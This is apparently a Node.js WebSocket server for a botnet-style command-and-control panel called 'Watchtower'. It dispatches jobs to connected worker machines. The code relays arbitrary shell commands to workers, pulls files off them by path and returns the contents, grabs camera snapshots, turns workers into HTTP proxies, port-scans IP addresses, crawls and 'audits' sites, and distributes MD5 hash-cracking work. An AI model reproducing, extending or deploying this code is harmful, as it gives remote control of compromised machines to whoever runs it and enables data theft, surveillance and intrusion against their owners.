const express = require('express');
const { Server } = require('ws');
const http = require('http');
const cors = require('cors');
const path = require('path');

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const SECRET_KEY = process.env.ACCESS_KEY; 

if (!SECRET_KEY) {
    console.error("FATAL ERROR: No ACCESS_KEY found in Environment Variables.");
    process.exit(1);
}

// --- STATE MANAGEMENT ---
let workers = new Map(); 
let clients = new Set(); 

let searchRange = 0;
const RANGE_SIZE = 100000;
let totalHashes = 0;
let foundGoldenTicket = null;

const app = express();
app.use(cors());
app.use('/assets', express.static(path.join(__dirname, 'assets')));
const server = http.createServer(app);
const wss = new Server({ server });

function generateId() {
    return 'UNIT-' + Math.random().toString(36).substr(2, 4).toUpperCase();
}

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

wss.on('connection', (ws, req) => {

    // SECURITY HANDSHAKE
    const urlParams = new URLSearchParams(req.url.replace('/',''));
    const providedKey = urlParams.get('key');

    if (providedKey !== SECRET_KEY) {
        ws.close();
        return;
    }

    const id = generateId();
    const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';

    workers.set(ws, { id: id, ip: ip, role: 'CONNECTING' });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            handleMessage(ws, data);
        } catch (e) { console.error('Invalid JSON:', e.message); }
    });

    ws.on('close', () => {
        workers.delete(ws);
        clients.delete(ws);
        broadcastStats();
    });
});

function handleMessage(ws, data) {
    const worker = workers.get(ws);

    switch (data.type) {
        case 'REGISTER_WORKER':
            if (worker) { worker.role = 'MINING'; }
            sendJob(ws);
            broadcastStats();
            break;

        case 'REGISTER_CLIENT':
            clients.add(ws);
            workers.delete(ws); 
            broadcastStats();
            break;

        case 'JOB_COMPLETE':
            totalHashes += RANGE_SIZE;
            if (worker) worker.role = 'IDLE'; 
            if (data.solution) foundGoldenTicket = data.solution;
            if (!foundGoldenTicket) sendJob(ws);
            broadcastStats();
            break;

        // --- MODULES ---
        case 'SEND_PROXY_CMD':
            const proxyWorkers = Array.from(workers.keys());
            if (proxyWorkers.length > 0) {
                const target = proxyWorkers[Math.floor(Math.random() * proxyWorkers.length)];
                if (workers.get(target)) {
                    workers.get(target).role = 'PROXYING';
                    broadcastStats();
                }
                target.send(JSON.stringify({ type: 'HTTP_PROXY', url: data.url, requestId: Date.now() }));
            }
            break;

        case 'PROXY_RESULT':
            clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
            if (worker) { setTimeout(() => { if (workers.has(ws)) { worker.role = 'IDLE'; broadcastStats(); } }, 1000); }
            break;

        case 'SEND_SHELL_CMD':
            const shellWorkers = Array.from(workers.keys());
            if (shellWorkers.length > 0) shellWorkers[0].send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
            break;

        case 'SHELL_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
             break;

        case 'SEND_EXFIL_CMD':
             const exfilWorkers = Array.from(workers.keys());
             if (exfilWorkers.length > 0) exfilWorkers[0].send(JSON.stringify({ type: 'EXFIL_CMD', path: data.path }));
             break;

        case 'EXFIL_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'EXFIL_RECEIVE', filename: data.filename, data: data.data })));
             break;

        case 'SEND_SNAPSHOT_CMD':
             const camWorkers = Array.from(workers.keys());
             if (camWorkers.length > 0) camWorkers[0].send(JSON.stringify({ type: 'SNAPSHOT_CMD', url: data.url }));
             break;

        case 'SEND_SNIPE_CMD':
             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'SNIPE_CMD', ticker: data.ticker })); });
             break;

        case 'SNIPE_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SNIPE_LOG', data: data })));
             break;

        case 'SEND_MAP_CMD':
             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'MAP_CMD', url: data.url })); });
             break;

        case 'MAP_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'MAP_LOG', data: data })));
             break;

        case 'SEND_SCAN_CMD':
             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'SCAN_CMD', ip: data.ip })); });
             break;

        case 'SCAN_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SCAN_LOG', data: data })));
             break;

        case 'SEND_ARCHIVE_CMD':
             const arcWorkers = Array.from(workers.keys());
             if (arcWorkers.length > 0) {
                 const target = arcWorkers[Math.floor(Math.random() * arcWorkers.length)];
                 target.send(JSON.stringify({ type: 'ARCHIVE_CMD', url: data.url }));
             }
             break;

        // --- NEW SPIDER MODULE ---
        case 'SEND_SPIDER_SCOUT':
             const scouts = Array.from(workers.keys());
             if (scouts.length > 0) {
                 const scout = scouts[Math.floor(Math.random() * scouts.length)];
                 scout.send(JSON.stringify({ type: 'SPIDER_SCOUT', url: data.url }));
             }
             break;

        case 'SPIDER_SCOUT_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SPIDER_SCOUT_LOG', data: data })));
             break;

        case 'SEND_SPIDER_AUDIT':
             const auditors = Array.from(workers.keys());
             if (auditors.length > 0) {
                 const auditor = auditors[Math.floor(Math.random() * auditors.length)];
                 auditor.send(JSON.stringify({ type: 'SPIDER_AUDIT', url: data.url }));
             }
             break;

        case 'SPIDER_AUDIT_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'SPIDER_AUDIT_LOG', data: data })));
             break;

        // --- STUDIO MODULE (ADDED) ---
        case 'SEND_STUDIO_CMD':
             const studioWorkers = Array.from(workers.keys());
             if (studioWorkers.length > 0) {
                 // Select 1 Worker to be the "Producer"
                 const producer = studioWorkers[Math.floor(Math.random() * studioWorkers.length)];
                 producer.send(JSON.stringify({ type: 'STUDIO_CMD' }));
                 
                 // Log to dashboard so you know it was sent
                 clients.forEach(c => c.send(JSON.stringify({ 
                     type: 'SHELL_LOG', 
                     output: `[STUDIO] Task delegated to Unit ${workers.get(producer).id}` 
                 })));
             } else {
                 clients.forEach(c => c.send(JSON.stringify({ 
                    type: 'SHELL_LOG', 
                    output: `[ERROR] No workers available for production.` 
                })));
             }
             break;
    }
}

function sendJob(ws) {
    if (foundGoldenTicket) {
        ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
        return;
    }
    const start = searchRange;
    const end = searchRange + RANGE_SIZE;
    searchRange += RANGE_SIZE;
    ws.send(JSON.stringify({ type: 'MINING_JOB', start: start, end: end, target: '81dc9bdb52d04dc20036dbd8313ed055' }));
}

function broadcastStats() {
    const workerArray = Array.from(workers.values());
    clients.forEach(c => { if (c.readyState === 1) c.send(JSON.stringify({ type: 'STATS', workers: workerArray, totalHashes: totalHashes, goldenTicket: foundGoldenTicket })); });
}

server.listen(PORT, () => console.log(`Watchtower Online on ${PORT}`));
